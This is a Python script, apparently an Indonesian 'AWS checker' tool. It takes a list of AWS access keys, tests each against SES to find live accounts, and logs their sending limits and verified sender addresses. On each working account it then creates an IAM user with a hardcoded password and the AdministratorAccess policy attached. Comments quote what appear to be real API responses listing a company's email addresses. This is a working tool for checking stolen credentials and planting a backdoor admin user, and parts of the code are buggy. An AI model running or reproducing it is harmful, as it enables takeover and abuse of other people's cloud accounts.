import requests
from colored import fg, bg, attr
import re
import boto3
import json
import random
import sys
import time
import itertools
from colorama import init
import threading
init()
logo = """\033[1;37m
╔═══╦╗───────╔╗───────╔═══╗
║╔═╗║║───────║║───────║╔═╗║
║║─╚╣╚═╦══╦══╣║╔╦══╦═╗║║─║╠╗╔╗╔╦══╗
║║─╔╣╔╗║║═╣╔═╣╚╝╣║═╣╔╝║╚═╝║╚╝╚╝║══╣╔══╗
║╚═╝║║║║║═╣╚═╣╔╗╣║═╣║─║╔═╗╠╗╔╗╔╬══║╚══╝
╚═══╩╝╚╩══╩══╩╝╚╩══╩╝─╚╝─╚╝╚╝╚╝╚══╝
\033[1m
╔╗╔═╗
║║║╔╝
║╚╝╝╔══╦╗─╔╗  Author =\033[93m [RiyanArtz C++]\033[0m
\033[1m║╔╗║║║═╣║─║║  Thank's =\033[96m ×Isabella Guzman×\033[0m
\033[1m║║║╚╣║═╣╚═╝║  Version = \033[93m0.5 beta\033[0m
\033[1m╚╝╚═╩══╩═╗╔╝  
\033[1m───────╔═╝║
\033[1m───────╚══╝"""
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def mengetik(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
#kecepatan mengetik
        time.sleep(random.random() * 0.01)
#ubah angka 0.1 sesuai keinginan kamu
#asngka terkecil adaalah ylang palimng caepnat
#angaka terlbesar adalfah yanag praling laimbat
mengetik(logo)

mengetik('\nsedang memuat script\n')

done = False

#animasi loading
def animate():
    for c in itertools.cycle(['|', '/', '-', '\\']):
        if done:
            break
        sys.stdout.write('\rHarap Tunggu ' + c + 'sedang memuat script'+c)
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write('\rSelesai ')
t = threading.Thread(target=animate)
t.start()
from colorama import Fore, Back, Style







time.sleep(2)
done = True

mengetik('\nMeload Data Combo Pastikan Data [user:key:region] \n ')

						
						
						
						
def checker(data):
	try:
		email = data[0]
		password = data[1]
		region = data[2]
		client = boto3.client(
		'ses'
		,aws_access_key_id=email
		,aws_secret_access_key=password
		,region_name = region)
		data = "[O][ACCOUNT]{}|{}|{}".format(email,password,region)
		print("\033[1m"  +  "\033[94m" + data)
		response = client.get_send_quota()
		mengetik(" \033[92m[Account Active]")
		limit =  "Max Send  24 Jam: {response['Max24HourSend']} "
		ddd = client.list_verified_email_addresses(
		)
		#[Account Active]                           {'VerifiedEmailAddresses': ['HiveHelpdesk@btistudios.com', 'NoReply.HiveHD@btistudios.com', 'Alerts.HiveHD@btistudios.com', 'NoReply.VendorBTI@btistudios.com'], 'ResponseMetadata': {'RequestId': '7c39c498-5d7d-43de-a437-227541468580', 'HTTPStatusCode': 200, 'HTTPHeaders': {'x-amzn-requestid': '7c39c498-5d7d-43de-a437-227541468580', 'content-type': 'text/xml', 'content-length': '577', 'date': 'Sun, 25 Oct 2020 09:35:03 GMT'}, 'RetryAttempts': 0}}
		getEmailListVer = "Email Terverifikasi:{ddd['VerifiedEmailAddresses']}"
		print(getEmailListVer)
		response = client.list_identities(
		IdentityType='EmailAddress',
		MaxItems=123,
		NextToken='',
		)
		
		listemail = "Email: {response['Identities']}"
		print(listemail)
		#{'Identities': ['HiveHelpdesk@btistudios.com', 'NoReply.HiveHD@btistudios.com', 'Alerts.HiveHD@btistudios.com', 'NoReply.VendorBTI@btistudios.com'], 'ResponseMetadata': {'RequestId': '4448b8b8-3fe8-4644-bcf4-d13b9ec5fa8a', 'HTTPStatusCode': 200, 'HTTPHeaders': {'x-amzn-requestid': '4448b8b8-3fe8-4644-bcf4-d13b9ec5fa8a', 'content-type': 'text/xml', 'content-length': '505', 'date': 'Fri, 23 Oct 2020 16:00:40 GMT'}, 'RetryAttempts': 0}}
		#print(response)
		statistic = client.get_send_statistics()
		getStatistic = "Email Terkirim Hari Ini:{statistic['SendDataPoints']}"
		print(getStatistic)
		print("Semus Data")
		xxx = email+"|"+password+"|"+region + "|" +  limit +"|" + listemail
		print(xxx)
		remover = str(xxx).replace('\r', '')
		simpan = open('Active.txt', 'a')
		simpan.write(remover+'\n\n')
		simpan.close()
		ValidData = email + ":" + password + ":" + region
		remover = str(ValidData).replace('\r', '')
		SimpValid = open('Create.txt', 'a')
		SimpValid.write(remover+'\n\n')
		SimpValid.close()
		totz  = len(SimpValid)
		print("Total SimpValid: " + totz)
		response = client.list_users(
		)
		print(response)
		
		#{'Max24HourSend': 200.0, 'MaxSendRate': 1.0, 'SentLast24Hours': 0.0, 'ResponseMetadata': {'RequestId': '640d0a86-6b5f-4965-b7fc-5127a820258a', 'HTTPStatusCode': 200, 'HTTPHeaders': {'x-amzn-requestid': '640d0a86-6b5f-4965-b7fc-5127a820258a', 'content-type': 'text/xml', 'content-length': '369', 'date': 'Fri, 23 Oct 2020 05:43:42 GMT'}, 'RetryAttempts': 0}}
		#print ("berhasil login")
		
	except:
		print("\033[91m[Account DIE]")
		pass
    #success_keyword = """"<strong>Today's Earnings:</strong>"""
    #api_sender = requests.session()    
def CreateAccount(DataValid):
	try:
		UsernameLogin = "tdesstanjidnhbanget"
		user = DataValid[0]
		keyacces = DataValid[1]
		regionz = DataValid[2]
		client = boto3.client(
		'iam'
		,aws_access_key_id=user
		,aws_secret_access_key=keyacces
		,region_name = regionz)
		data = "[O][ACCOUNT]{}|{}|{}".format(user,keyacces,regionz)
		print(data)
		Create_user = client.create_user(
		UserName=UsernameLogin,
		)
		print("berhasil membuat account")
		bitcg = "User: {Create_user['User'] ['UserName']}"
		xxxxcc = "User: {Create_user['User'] ['Arn']}"
		
		print(bitcg)
		print(xxxxcc)
		
		#keluan 'Arn': 'arn:aws:iam::320406895696:user/Kontolz'
		#debug mode create
		print(Create_user)
		#set konstanta pws 
		pws = "HeieugxiwiwydhxhKont#olJsusu/dhd62282939s1826"
		print("Username = " + UsernameLogin)
		print("Membuat Akses Login Untuk Username " + UsernameLogin)
		Buat = client.create_login_profile(
		Password=pws,
		PasswordResetRequired=False,
		UserName=UsernameLogin
		)
		print(Buat)
		
		#'LoginProfile': {'UserName': 'Kontolz', 'CreateDate':
		print("password:" + pws)
		print("Memberikan Akses ke User Sebagai Admin")
		Admin = client.attach_user_policy(
		PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess',
		UserName=UsernameLogin,
		)
		
		print(Admin)
		
		
		
	except:
		pass
	
print("Gunakan Format user:keys:region")
listaws = input("Masukan List Aws: ")

combos = open(listaws, "r").readlines()
total = len(combos)
mengetik("Total Key Aws = " + str(total))
mengetik("\n Harap Gunakan Format user:keys:region")
arrange = [lines.replace("\n", "")for lines in combos]
for lines in arrange:
    data = lines.split(":")
    checker(data)
 
mengetik("Proses Checker Telah Selesai")
mengetik("Auto Membuat Acces IAM untuk mengakses dashboard AWS")
mengetik("membuka file Create.txt")


rd = open("Create.txt", "r").readlines()
todd = len(rd)

print(todd)

loc = [valz.replace("\n", "")for valz in rd]
for valz in loc:
	datas = valz.split(":")
	CreateAccount(datas)
	
	
	






